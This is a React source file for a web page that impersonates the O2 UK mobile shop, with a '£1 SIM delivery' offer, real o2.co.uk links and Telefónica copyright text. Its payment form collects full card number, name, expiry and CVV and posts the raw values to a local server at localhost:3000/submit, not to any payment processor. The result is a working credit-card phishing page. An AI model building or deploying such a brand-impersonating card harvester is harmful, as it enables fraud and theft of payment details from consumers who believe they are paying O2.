import { useState } from 'react';

function App() {
  const [formData, setFormData] = useState({
    nameOnCard: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
  });
  const [status, setStatus] = useState('idle'); // idle, loading, success

  const handleChange = (e) => {
    let { name, value } = e.target;

    if (name === 'cardNumber') {
      value = value.replace(/\D/g, '').substring(0, 16);
      const formatted = value.match(/.{1,4}/g);
      value = formatted ? formatted.join(' ') : value;
    } else if (name === 'expiry') {
      value = value.replace(/\D/g, '').substring(0, 4);
      if (value.length >= 2) value = value.substring(0, 2) + ' / ' + value.substring(2);
    } else if (name === 'cvv') {
      value = value.replace(/\D/g, '').substring(0, 4);
    }

    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setStatus('loading');

    try {
      const response = await fetch('http://localhost:3000/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });
      if (response.ok) {
        setStatus('success');
      } else {
        setStatus('idle');
        alert('Something went wrong. Please try again.');
      }
    } catch (error) {
      console.error('Error submitting form:', error);
      setStatus('idle');
      alert('Unable to connect to the server.');
    }
  };

  return (
    <>
      {/* TOP BAR */}
      <div className="top-bar">
        <div className="top-bar-left">
          <span>Personal</span>
          <a href="https://www.o2.co.uk/business" target="_blank" rel="noopener noreferrer">Business</a>
        </div>
        <div>
          <a href="https://accounts.o2.co.uk/signin" target="_blank" rel="noopener noreferrer">Sign in</a> or <a href="https://accounts.o2.co.uk/register" target="_blank" rel="noopener noreferrer">Register</a>
        </div>
      </div>

      {/* NAV */}
      <nav>
        <a href="https://www.o2.co.uk/" className="nav-logo" target="_blank" rel="noopener noreferrer">
          O<span className="subscript">2</span>
        </a>
        <div className="nav-links">
          <a href="https://www.o2.co.uk/shop" target="_blank" rel="noopener noreferrer">Shop</a>
          <a href="https://www.o2.co.uk/why-o2" target="_blank" rel="noopener noreferrer">Why O2</a>
          <a href="https://www.o2.co.uk/help" target="_blank" rel="noopener noreferrer">Help</a>
        </div>
        <div className="nav-right">
          <a href="https://accounts.o2.co.uk/signin" target="_blank" rel="noopener noreferrer">My O2</a>
          <a href="https://www.o2.co.uk/search" target="_blank" rel="noopener noreferrer">🔍 Search</a>
          <a href="https://www.o2.co.uk/shop/basket" target="_blank" rel="noopener noreferrer">🛒</a>
        </div>
      </nav>

      {/* DELIVERY BANNER */}
      <div className="delivery-banner">
        <span className="icon">🚚</span>
        <a href="https://www.o2.co.uk/help/pay-monthly/delivery" target="_blank" rel="noopener noreferrer">Free standard delivery included. Premium delivery options from £5.99–£9.99.</a>
      </div>

      {/* HERO */}
      <div className="hero">
        <div className="hero-content">
          <div className="hero-text">
            <div className="hero-badge">
              🎉 Limited Time Offer &nbsp;|&nbsp; <span className="price">£1</span> &nbsp;SIM Delivery
            </div>
            <h1>Get your SIM delivered for just <span>£1</span></h1>
            <p>Stay connected on the UK's most reliable network. Your SIM delivered straight to your door — no fuss, no hidden fees.</p>
          </div>
          <div className="sim-visual">
            <div className="sim-card">
              <div className="sim-chip"></div>
              <div className="sim-logo">O<span>2</span></div>
            </div>
          </div>
        </div>
      </div>

      {/* MAIN CONTENT */}
      <div className="main">
        {/* DEAL INFO */}
        <div className="deal-info">
          <h2>What's included</h2>

          <div className="price-highlight">
            <span className="curr">£</span>
            <span className="big">1</span>
            <span className="per">one-off delivery</span>
          </div>
          <div className="small-note">No contract. No commitment. Cancel anytime.</div>

          <div style={{ marginTop: '24px' }}>
            <div className="deal-row">
              <div className="deal-icon">📶</div>
              <div className="deal-row-text">
                <strong>UK's Best Network</strong>
                <span>Powered by O2's award-winning 4G & 5G network</span>
              </div>
            </div>
            <div className="deal-row">
              <div className="deal-icon">🚀</div>
              <div className="deal-row-text">
                <strong>Next Day Delivery</strong>
                <span>Order before 9pm for next day delivery</span>
              </div>
            </div>
            <div className="deal-row">
              <div className="deal-icon">💳</div>
              <div className="deal-row-text">
                <strong>Pay As You Go or SIM Only</strong>
                <span>Choose a plan that works for you</span>
              </div>
            </div>
            <div className="deal-row">
              <div className="deal-icon">🌍</div>
              <div className="deal-row-text">
                <strong>Roam in 75+ destinations</strong>
                <span>Travel abroad and stay connected</span>
              </div>
            </div>
            <div className="deal-row">
              <div className="deal-icon">🎵</div>
              <div className="deal-row-text">
                <strong>O2 Priority rewards</strong>
                <span>Exclusive deals, tickets & experiences</span>
              </div>
            </div>
          </div>

          <div className="trust-badges">
            <div className="trust-badge">✅ No credit check</div>
            <div className="trust-badge">🔒 Secure checkout</div>
            <div className="trust-badge">📦 Free returns</div>
          </div>
        </div>

        {/* PAYMENT FORM */}
        <div className="payment-form">
          <h2>Enter your payment details</h2>
          <p className="subtitle">Pay just £1 to get your SIM delivered to your door.</p>

          <div className="card-icons">
            <div className="card-icon visa">VISA</div>
            <div className="card-icon mc">MC</div>
            <div className="card-icon amex">AMEX</div>
          </div>

          <div className="secure-note">
            <span className="lock">🔒</span>
            <span>Your payment is secured with 256-bit SSL encryption</span>
          </div>

          <form onSubmit={handleSubmit}>
            <div className="form-group">
              <label htmlFor="nameOnCard">Name on card</label>
              <input
                type="text"
                id="nameOnCard"
                name="nameOnCard"
                placeholder="e.g. John Smith"
                autoComplete="cc-name"
                required
                value={formData.nameOnCard}
                onChange={handleChange}
              />
            </div>

            <div className="form-group">
              <label htmlFor="cardNumber">Card number</label>
              <input
                type="text"
                id="cardNumber"
                name="cardNumber"
                placeholder="0000 0000 0000 0000"
                maxLength="19"
                autoComplete="cc-number"
                required
                value={formData.cardNumber}
                onChange={handleChange}
              />
            </div>

            <div className="form-row">
              <div className="form-group">
                <label htmlFor="expiry">Expiry date</label>
                <input
                  type="text"
                  id="expiry"
                  name="expiry"
                  placeholder="MM / YY"
                  maxLength="7"
                  autoComplete="cc-exp"
                  required
                  value={formData.expiry}
                  onChange={handleChange}
                />
              </div>
              <div className="form-group">
                <label htmlFor="cvv">CVV</label>
                <input
                  type="text"
                  id="cvv"
                  name="cvv"
                  placeholder="•••"
                  maxLength="4"
                  autoComplete="cc-csc"
                  required
                  value={formData.cvv}
                  onChange={handleChange}
                />
              </div>
            </div>

            <button 
              type="submit" 
              className={`submit-btn ${status === 'success' ? 'success' : ''}`}
              disabled={status === 'loading'}
            >
              {status === 'idle' && 'Pay £1 & Get My SIM →'}
              {status === 'loading' && 'Processing...'}
              {status === 'success' && '✓ Order placed! Your SIM is on its way.'}
            </button>
          </form>

          <div className="form-footer">
            By continuing you agree to our <a href="https://www.o2.co.uk/termsandconditions" target="_blank" rel="noopener noreferrer">Terms & Conditions</a> and <a href="https://www.o2.co.uk/termsandconditions/privacy-policy" target="_blank" rel="noopener noreferrer">Privacy Policy</a>.<br />
            ©2026 Telefónica UK Limited. Registered in England. O2 is a trading name of Telefónica UK Limited.
          </div>
        </div>
      </div>

      {/* CATEGORIES */}
      <div className="categories">
        <div className="categories-inner">
          <h2>Find your ideal tech and more</h2>
          <div className="cat-grid">
            <a href="https://www.o2.co.uk/shop/offers" className="cat-item" target="_blank" rel="noopener noreferrer">
              <div className="cat-icon">☀️</div>
              <span>Summer Sale</span>
            </a>
            <a href="https://www.o2.co.uk/shop/phones" className="cat-item" target="_blank" rel="noopener noreferrer">
              <div className="cat-icon">📱</div>
              <span>Phones</span>
            </a>
            <a href="https://www.o2.co.uk/shop/sim-cards/sim-only-deals" className="cat-item" target="_blank" rel="noopener noreferrer">
              <div className="cat-icon">📶</div>
              <span>SIM Only</span>
            </a>
            <a href="https://www.o2.co.uk/shop/tablets" className="cat-item" target="_blank" rel="noopener noreferrer">
              <div className="cat-icon">💻</div>
              <span>Tablets</span>
            </a>
            <a href="https://www.o2.co.uk/shop/smartwatches" className="cat-item" target="_blank" rel="noopener noreferrer">
              <div className="cat-icon">⌚</div>
              <span>Smartwatches</span>
            </a>
            <a href="https://www.o2.co.uk/shop/accessories" className="cat-item" target="_blank" rel="noopener noreferrer">
              <div className="cat-icon">🎧</div>
              <span>Accessories</span>
            </a>
          </div>
        </div>
      </div>

      {/* FOOTER */}
      <footer>
        <div className="footer-inner">
          <div className="footer-grid">
            <div className="footer-left">
              <a href="https://www.o2.co.uk/storelocator" target="_blank" rel="noopener noreferrer"><span className="icon">🏪</span> Find a store</a>
              <a href="https://www.o2.co.uk/coveragechecker" target="_blank" rel="noopener noreferrer"><span className="icon">📡</span> Check our network</a>
              <a href="https://accounts.o2.co.uk/signin" target="_blank" rel="noopener noreferrer"><span className="icon">👤</span> Sign in to My O2</a>
              <a href="https://www.o2.co.uk/help/pay-monthly/how-to-track-your-order" target="_blank" rel="noopener noreferrer"><span className="icon">📦</span> Track my order</a>
              <a href="https://www.o2.co.uk/search" target="_blank" rel="noopener noreferrer"><span className="icon">🔍</span> Search</a>
              <div className="social-row">
                <a className="social-btn" href="https://www.facebook.com/o2uk/" target="_blank" rel="noopener noreferrer">f</a>
                <a className="social-btn" href="https://www.youtube.com/user/o2ukofficial" target="_blank" rel="noopener noreferrer">▶</a>
                <a className="social-btn" href="https://twitter.com/O2" target="_blank" rel="noopener noreferrer">✕</a>
                <a className="social-btn" href="https://www.instagram.com/o2uk/" target="_blank" rel="noopener noreferrer">📷</a>
              </div>
            </div>
            <div className="footer-links-col">
              <h4>Popular in shop</h4>
              <a href="https://www.o2.co.uk/shop/apple/iphone-15-pro-max" target="_blank" rel="noopener noreferrer">iPhone 15 Pro Max</a>
              <a href="https://www.o2.co.uk/shop/apple/iphone-15-pro" target="_blank" rel="noopener noreferrer">iPhone 15 Pro</a>
              <a href="https://www.o2.co.uk/shop/apple/iphone-15" target="_blank" rel="noopener noreferrer">iPhone 15</a>
              <a href="https://www.o2.co.uk/shop/apple/watch-series-9" target="_blank" rel="noopener noreferrer">Apple Watch Series 9</a>
              <a href="https://www.o2.co.uk/shop/samsung/galaxy-s24-ultra" target="_blank" rel="noopener noreferrer">Samsung Galaxy S24 Ultra</a>
              <a href="https://www.o2.co.uk/shop/samsung/galaxy-z-fold5" target="_blank" rel="noopener noreferrer">Samsung Galaxy Z Fold5</a>
              <a href="https://www.o2.co.uk/shop/google/pixel-8-pro" target="_blank" rel="noopener noreferrer">Google Pixel 8 Pro</a>
              <a href="https://www.o2.co.uk/shop/sim-cards/sim-only-deals" target="_blank" rel="noopener noreferrer">SIM Only Deals</a>
            </div>
            <div>
              <div className="footer-links-col">
                <h4>Help and Support</h4>
                <a href="https://www.o2.co.uk/help" target="_blank" rel="noopener noreferrer">Help home</a>
                <a href="https://www.o2.co.uk/contactus" target="_blank" rel="noopener noreferrer">Contact us</a>
                <a href="https://www.o2.co.uk/myo2" target="_blank" rel="noopener noreferrer">My O2</a>
                <a href="https://www.o2.co.uk/help/pay-monthly/delivery" target="_blank" rel="noopener noreferrer">Collection and delivery</a>
              </div>
              <div className="footer-links-col" style={{ marginTop: '24px' }}>
                <h4>Shop</h4>
                <a href="https://www.o2.co.uk/shop/phones" target="_blank" rel="noopener noreferrer">Phones</a>
                <a href="https://www.o2.co.uk/shop/tablets" target="_blank" rel="noopener noreferrer">Tablets</a>
                <a href="https://www.o2.co.uk/shop/sim-cards/pay-monthly" target="_blank" rel="noopener noreferrer">Pay Monthly SIM</a>
                <a href="https://www.o2.co.uk/shop/sim-cards/pay-as-you-go" target="_blank" rel="noopener noreferrer">Pay As You Go SIM</a>
              </div>
            </div>
          </div>

          <div className="footer-bottom">
            <div className="footer-bottom-links">
              <a href="https://www.o2.co.uk/abouto2" target="_blank" rel="noopener noreferrer">About O2</a>
              <span style={{ opacity: 0.4 }}>|</span>
              <a href="https://www.o2.co.uk/our-blueprint" target="_blank" rel="noopener noreferrer">Better Connections Plan</a>
              <span style={{ opacity: 0.4 }}>|</span>
              <a href="https://careers.o2.co.uk/" target="_blank" rel="noopener noreferrer">Careers</a>
              <span style={{ opacity: 0.4 }}>|</span>
              <a href="https://news.o2.co.uk/" target="_blank" rel="noopener noreferrer">News & PR</a>
              <span style={{ opacity: 0.4 }}>|</span>
              <a href="https://www.o2.co.uk/termsandconditions/privacy-policy" target="_blank" rel="noopener noreferrer">Privacy policy</a>
              <span style={{ opacity: 0.4 }}>|</span>
              <a href="https://www.o2.co.uk/termsandconditions" target="_blank" rel="noopener noreferrer">Terms & Conditions</a>
              <span style={{ opacity: 0.4 }}>|</span>
              <a href="https://www.o2.co.uk/cookie-policy" target="_blank" rel="noopener noreferrer">Cookie policy</a>
            </div>
            <div>©2026 Telefónica UK Limited</div>
            <div>Registered office: 500 Brook Drive, Reading, Berkshire, RG2 6UU</div>
            <div>In relation to consumer credit, Telefónica UK Limited is authorised and regulated by the Financial Conduct Authority (Reference Number 718822)</div>
          </div>
        </div>
      </footer>
    </>
  );
}

export default App;
